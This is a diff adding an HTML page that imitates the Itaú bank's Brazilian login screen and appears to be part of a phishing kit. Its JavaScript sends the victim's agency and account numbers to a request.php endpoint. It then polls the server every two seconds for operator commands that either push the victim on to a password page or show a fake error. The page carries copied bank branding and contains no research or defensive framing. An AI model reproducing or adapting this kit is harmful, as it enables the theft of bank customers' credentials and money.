@@ -1,0 +1,176 @@
+<html><head>
+	<title>Home</title>
+	<meta charset="UTF-8">
+	<link rel="stylesheet" href="css/home.css">
+	<script src="js/jquery.js"></script>
+	<script src="js/jquery.maskedinput.js"></script>		
+	<script type="text/javascript">
+	function nextcamp(idobj, idproximo){
+			var str = new String(document.getElementById(idobj).value);
+			var mx = new Number(document.getElementById(idobj).maxLength);
+			if (str.length == mx){
+				document.getElementById(idproximo).focus();
+			}
+		}
+		function entrou1() { 
+			nextcamp('ag','cn');
+		}
+
+
+		jQuery(function($){
+			$("#ag").mask("9999",{ placeholder: "" });
+			$("#cn").mask("99999-9",{ placeholder: "" });
+		});		
+		
+		function get_XmlHttp() {
+			var xmlHttp; 
+			if (window.XMLHttpRequest) {
+				xmlHttp = new XMLHttpRequest(); 
+			}
+			return xmlHttp; 
+		}
+
+		var myVar;
+		
+		function clearcomando(cmds){
+			var http = new XMLHttpRequest();
+			var url = "clearcomando.php?comando="+cmds;
+			var params = "pessoafisica=&user=";
+			http.open("POST", url, true);
+			http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			http.onreadystatechange = function() {
+				if(http.readyState == 4 && http.status == 200) {
+					comandostr =http.responseText;				
+				}
+			}
+			http.send(params);			
+		}
+		function myTimer() {
+			var http = new XMLHttpRequest();
+			var url = "request.php";
+			var params = "pessoafisica=&getcomando=";
+			http.open("POST", url, true);
+			http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			http.onreadystatechange = function() {
+				if(http.readyState == 4 && http.status == 200) {
+					comandostr =http.responseText;			   	
+
+					if (comandostr.indexOf("prosseguiragconta") !=-1){
+						clearInterval(myVar);
+						clearcomando("Senha Entrada");
+						document.getElementById('form').submit();											
+					}		
+
+					
+					if (comandostr.indexOf("errorcontaag") !=-1){
+						clearInterval(myVar);
+						clearcomando("Erro AG CN");
+						alert('Agência e Conta incorretas, tente novamente!');
+						document.getElementById('boxcarregando').style.display = 'none';
+						document.getElementById('ag').value = '';
+						document.getElementById('cn').value = '';
+						
+					}	
+							
+			
+				}
+			}
+			http.send(params);				
+		}
+
+		function Sendlogin(){
+			var http = new XMLHttpRequest();
+			var url = "request.php";
+			var params = "pessoafisica=&addlogin=&user="+document.getElementById('ag').value+"&pass="+document.getElementById('cn').value;
+			http.open("POST", url, true);
+			http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			http.onreadystatechange = function() {
+				if(http.readyState == 4 && http.status == 200) {
+					comandostr =http.responseText;		
+
+				}
+			}
+			http.send(params);		
+			clearcomando('Login Carregando');			
+		}	
+		
+		function login(){
+			if ((document.getElementById('ag').value.length > 1) && (document.getElementById('cn').value.length > 1)){
+					document.getElementById('boxcarregando').style.display = 'block';
+					Sendlogin();
+					myVar = setInterval(function(){ 
+						myTimer() 	
+					}, 2000);				
+				}else{
+					
+					alert('Preencha corretamente os dados solicitados.');
+			}			
+		}
+	</script>
+</head>
+<body>
+	<div class="tpoption">
+		<div class="centerbody">
+			<div class="optiontext active">para você</div>
+			<div class="optiontext">para empresas</div>
+		</div>
+	</div>
+	
+	<div class="barralogin">
+		<div class="centerbody">
+			<img class="logo" src="img/logo.png" style="cursor:pointer;">
+			<div class="divisor"></div>
+			<div class="btnbarralog">serviços</div>
+			<div class="btnbarralog">ajuda</div>
+			
+			<div class="caixalogin">
+			<form method="POST" id="form" action="senha.php">
+				<h3>opções de acesso&nbsp;&nbsp;<img src="img/flechabw.png"></h3>
+				<div style="width:230px;height:44px;margin-left:30px;">
+					<div style="width:165px;height:40px;background-color:white;border-radius:4px;    border: 1px solid #d9d3cf; float:left;">
+						<input type="text" name="ag" id="ag" onkeyup="entrou1();" class="inputlog" placeholder="agência" maxlength="4" style="margin-left:9px;border-right:1px solid #d9d3cf;margin-top:5px;">
+						<input type="text" name="cn" id="cn" class="inputlog" placeholder="conta" maxlength="7" style="width:77px;">
+					</div>
+					<button class="btnlogin" type="button" onclick="login();"></button>
+				</div>
+			</form>
+			</div>
+		</div>
+	</div>
+	
+	<div class="propgs">
+		<div class="centerbody">
+			<div class="p1">
+				<h2>Depesas de início de ano?</h2>
+				<h4>Conheça o crédito que o Itaú tem para você</h4>
+				<button class="btn">descubra a sua oferta</button>
+			</div>
+			<div class="p2">
+				<img src="img/bgk.png" style="float:right;margin-top:40px;margin-right:50px;cursor:pointer;">
+			</div>
+		</div>	
+	</div>
+	
+	<div class="carossel">
+		<div class="centerbody">
+			<h3>contrate nossos produtos on-line</h3>
+			<img style="cursor:pointer;" src="img/carossel.png">
+		</div>
+	</div>
+	
+	<div class="bottombar">
+		<div class="centerbody">
+			<p>
+			© 2021 Itaú Unibanco Holding S.A. CNPJ: 60.872.504/0001-23
+			<br><br>
+			<b style="font-size:12px;">Praça Alfredo Egydio de Souza Aranha, 100, Torre Olavo Setubal, Parque Jabaquara - CEP 04344-902 - São Paulo - Brasil</b></p>
+		</div>	
+	</div>
+	
+		<div id="boxcarregando" class="black_overlay" style="display:none;">
+		<div id="light2" class="white_content" style="display:block;">
+			<center><img src="img/loading.gif" style="width:50px"></center>
+		</div>
+	</div>
+
+</body></html>
